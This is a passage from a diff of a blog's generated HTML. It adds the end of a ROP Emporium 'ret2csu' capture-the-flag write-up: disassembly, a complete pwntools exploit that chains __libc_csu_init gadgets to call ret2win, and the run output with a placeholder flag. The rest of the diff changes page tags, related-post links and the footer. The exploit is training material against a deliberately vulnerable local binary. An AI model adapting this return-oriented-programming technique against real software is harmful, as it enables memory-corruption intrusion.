+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x004006a3</span>                 <span style="color:#f99b15">5</span><span style="color:#ef6155">f</span>  <span style="color:#ef6155">pop</span> rdi
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x004006a4</span>                 <span style="color:#ef6155">c3</span>  <span style="color:#ef6155">ret</span>
+</code></pre></div><p>Now we can pass the <strong>0xdeadbeefdeadbeef</strong> argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.</p>
+<h2 id="exploit">Exploit</h2>
+<p>The full code of the rop is as shown below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#5bc4bf">import</span> <span style="color:#fec418">pwn</span>
+
+pwn<span style="color:#5bc4bf">.</span>context<span style="color:#5bc4bf">.</span>encoding <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;latin-1&#34;</span> 
+pwn<span style="color:#5bc4bf">.</span>warnings<span style="color:#5bc4bf">.</span>simplefilter(<span style="color:#48b685">&#34;ignore&#34;</span>)
+pwn<span style="color:#5bc4bf">.</span>context<span style="color:#5bc4bf">.</span>arch <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;amd64&#34;</span>
+io <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>process(<span style="color:#48b685">&#39;./ret2csu&#39;</span>)
+
+<span style="color:#776e71">#arguments passed to ret2win function ret2win(arg1, arg2, arg3)</span>
+arg1 <span style="color:#5bc4bf">=</span>pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0xdeadbeefdeadbeef</span>)
+arg2 <span style="color:#5bc4bf">=</span>pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0xcafebabecafebabe</span>)
+arg3 <span style="color:#5bc4bf">=</span>pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0xd00df00dd00df00d</span>)
+
+ret2win_addr <span style="color:#5bc4bf">=</span>pwn<span style="color:#5bc4bf">.</span>p64(io<span style="color:#5bc4bf">.</span>elf<span style="color:#5bc4bf">.</span>plt[<span style="color:#48b685">&#39;ret2win&#39;</span>])   <span style="color:#776e71">#resolve address of ret2win function</span>
+pop_rbx_rbp_r12_r13_r14_r15_addr <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x0040069a</span>)  <span style="color:#776e71">#first stage gadget</span>
+dereference_pointer <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x00600e48</span>)  <span style="color:#776e71">#bss area which is executable</span>
+stage2_addr <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x00400680</span>)  <span style="color:#776e71">#addr of second stage rop chain</span>
+pop_rdi <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x004006a3</span>)
+
+<span style="color:#776e71">#ropchains</span>
+<span style="color:#776e71">#stage1 ropchain</span>
+<span style="color:#48b685">&#39;&#39;&#39;
+</span><span style="color:#48b685">            0x0040069a      pop   rbx
+</span><span style="color:#48b685">│           0x0040069b      pop   rbp
+</span><span style="color:#48b685">│           0x0040069c      pop   r12
+</span><span style="color:#48b685">│           0x0040069e      pop   r13
+</span><span style="color:#48b685">│           0x004006a0      pop   r14
+</span><span style="color:#48b685">│           0x004006a2      pop   r15
+</span><span style="color:#48b685">└           0x004006a4      ret
+</span><span style="color:#48b685">&#39;&#39;&#39;</span>
+
+<span style="color:#776e71">#Determine the loop values for conditional branch</span>
+<span style="color:#48b685">&#39;&#39;&#39;
+</span><span style="color:#48b685">╎│          0x00400689      call  qword [r12 + rbx*8]
+</span><span style="color:#48b685">│      ╎│   0x0040068d      add   rbx, 1
+</span><span style="color:#48b685">│      ╎│   0x00400691      cmp   rbp, rbx
+</span><span style="color:#48b685">│      └──&lt; 0x00400694      jne   0x400680
+</span><span style="color:#48b685">&#39;&#39;&#39;</span>
+
+
+stage1 <span style="color:#5bc4bf">=</span> pop_rbx_rbp_r12_r13_r14_r15_addr
+stage1 <span style="color:#5bc4bf">+=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0</span>)   <span style="color:#776e71">#set RBP=0</span>
+stage1 <span style="color:#5bc4bf">+=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">1</span>)   <span style="color:#776e71">#set RBX=1</span>
+stage1 <span style="color:#5bc4bf">+=</span> dereference_pointer <span style="color:#776e71">#set R12</span>
+stage1 <span style="color:#5bc4bf">+=</span> arg1   <span style="color:#776e71">#R13</span>
+stage1 <span style="color:#5bc4bf">+=</span> arg2   <span style="color:#776e71">#R14</span>
+stage1 <span style="color:#5bc4bf">+=</span> arg3   <span style="color:#776e71">#R15</span>
+stage1 <span style="color:#5bc4bf">+=</span> stage2_addr
+stage1 <span style="color:#5bc4bf">+=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0</span>)<span style="color:#5bc4bf">*</span><span style="color:#f99b15">7</span>   <span style="color:#776e71">#adjust the stack</span>
+
+
+
+<span style="color:#776e71">#stage2</span>
+<span style="color:#48b685">&#39;&#39;&#39;
+</span><span style="color:#48b685">   ┌──&gt;     0x00400680      mov   rdx, r15
+</span><span style="color:#48b685">│      ╎│   0x00400683      mov   rsi, r14
+</span><span style="color:#48b685">│      ╎│   0x00400686      mov   edi, r13d
+</span><span style="color:#48b685">│      ╎│   0x00400689      call  qword [r12 + rbx*8]
+</span><span style="color:#48b685">&#39;&#39;&#39;</span>
+
+stage2 <span style="color:#5bc4bf">=</span> pop_rdi
+stage2 <span style="color:#5bc4bf">+=</span>arg1
+stage2 <span style="color:#5bc4bf">+=</span>ret2win_addr 
+
+
+payload <span style="color:#5bc4bf">=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#34;A&#34;</span><span style="color:#5bc4bf">*</span><span style="color:#f99b15">32</span>
+payload <span style="color:#5bc4bf">+=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#34;B&#34;</span><span style="color:#5bc4bf">*</span><span style="color:#f99b15">8</span>
+payload <span style="color:#5bc4bf">+=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#34;&#34;</span> <span style="color:#5bc4bf">.</span>join([
+    stage1,
+    stage2
+    ])
+
+io<span style="color:#5bc4bf">.</span>writeafter(<span style="color:#48b685">&#39;&gt;&#39;</span>, payload)
+pwn<span style="color:#5bc4bf">.</span>info(io<span style="color:#5bc4bf">.</span>recvall()<span style="color:#5bc4bf">.</span>decode())
+</code></pre></div><p>Running the exploit code above we get the correct flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vx@archie:ret2csu$ python3 xpl.py 
+<span style="color:#5bc4bf">[</span>+<span style="color:#5bc4bf">]</span> Starting local process <span style="color:#48b685">&#39;./ret2csu&#39;</span>: pid <span style="color:#f99b15">18869</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#5bc4bf">(</span>0x400000<span style="color:#5bc4bf">)</span>
+    RUNPATH:  b<span style="color:#48b685">&#39;.&#39;</span>
+<span style="color:#5bc4bf">[</span>+<span style="color:#5bc4bf">]</span> Receiving all data: Done <span style="color:#5bc4bf">(</span>45B<span style="color:#5bc4bf">)</span>
+<span style="color:#5bc4bf">[</span>*<span style="color:#5bc4bf">]</span> Process <span style="color:#48b685">&#39;./ret2csu&#39;</span> stopped with exit code <span style="color:#f99b15">0</span> <span style="color:#5bc4bf">(</span>pid 18869<span style="color:#5bc4bf">)</span>
+<span style="color:#5bc4bf">[</span>*<span style="color:#5bc4bf">]</span>  Thank you!
+    ROPE<span style="color:#5bc4bf">{</span>a_placeholder_32byte_flag!<span style="color:#5bc4bf">}</span>
+</code></pre></div><h2 id="references">References</h2>
+<ol>
+<li><a class="link" href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf"  target="_blank" rel="noopener"
+    > Universal ROP or Return-to-csu</a></li>
+<li><a class="link" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html"  target="_blank" rel="noopener"
+    >Linux program startup</a></li>
+</ol>
+
 </section>
 
 
@@ -285,11 +458,11 @@
     
     <section class="article-tags">
         
-            <a href="/tags/ropemprium/">ropemprium</a>
-        
             <a href="/tags/rop/">rop</a>
         
             <a href="/tags/pwn/">pwn</a>
+        
+            <a href="/tags/ropemporium/">ropemporium</a>
         
     </section>
 
@@ -300,6 +473,8 @@
     
 </article>
 
+    
+
     <aside class="related-contents--wrapper">
     
     
@@ -308,45 +483,15 @@
             <div class="flex article-list--tile">
                 
                     
-<article class="">
-    <a href="/p/return-oriented-programming-pivot/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Pivot</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
-    <a href="/p/return-oriented-programming-fluff/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Fluff</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
-    <a href="/p/return-oriented-programming-badchars/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Badchars</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
+<article class="has-image">
     <a href="/p/return-oriented-programming-write4/">
         
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/write4.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/write4.jpg"/>
+                
+            </div>
         
 
         <div class="article-details">
@@ -356,13 +501,55 @@
 </article>
                 
                     
-<article class="">
+<article class="has-image">
     <a href="/p/return-oriented-programming-callme/">
         
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/callme.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/callme.jpg"/>
+                
+            </div>
         
 
         <div class="article-details">
             <h2 class="article-title">Return-Oriented Programming - Callme</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/return-oriented-programming-split/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/split.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/split.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Return-Oriented Programming - Split</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/return-oriented-programming-ret2win/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/ret2win.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/ret2win.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Return-Oriented Programming - Ret2win</h2>
         </div>
     </a>
 </article>
@@ -383,12 +570,12 @@
         
             2020 - 
         
-        2021 Solar Bits
+        2022 Solar Bits
     </section>
     
     <section class="powerby">
         Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.6.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
     </section>
 </footer>
 
@@ -472,6 +659,36 @@
             >
 
             </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#pwnme-disassembly">pwnme Disassembly</a></li>
+    <li><a href="#__libc_csu_init__-disassembly"><strong>libc_csu_init</strong> Disassembly</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#references">References</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
     
 
         </div>
